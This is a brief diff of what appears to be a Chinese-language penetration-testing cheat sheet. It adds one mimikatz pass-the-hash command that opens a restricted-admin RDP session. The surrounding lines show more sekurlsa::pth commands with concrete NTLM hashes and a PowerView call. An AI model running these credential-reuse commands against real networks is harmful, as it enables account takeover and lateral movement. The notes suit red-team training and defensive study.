@@ -170,6 +170,7 @@ powershell -command "cd C:/Users/benbi/Desktop/; Import-Module .\powerview.ps1; 
 ```sh
 sekurlsa::pth /user:administrator /domain:g1ts /ntlm:ad5a870327c02f83cb947af6a94a4c23
 mimikatz.exe "sekurlsa::pth /user:<user name> /domain:<domain name> /ntlm:<the user's ntlm hash> /run:powershell.exe"
+mimikatz.exe "sekurlsa::pth /user:fuwuqi /domain:172.16.235.6 /ntlm:f9272c84db38a009439ba30fb23ecb2d "/run:mstsc.exe /restrictedadmin"
 # pth 传递弹出cmd
 mimikatz.exe "privilege::debug" "sekurlsa::pth /user:WIN2016$ /domain:g1ts /ntlm:19b241fc247a06034210b12ae3aca2d9"
 # pth 读取数据
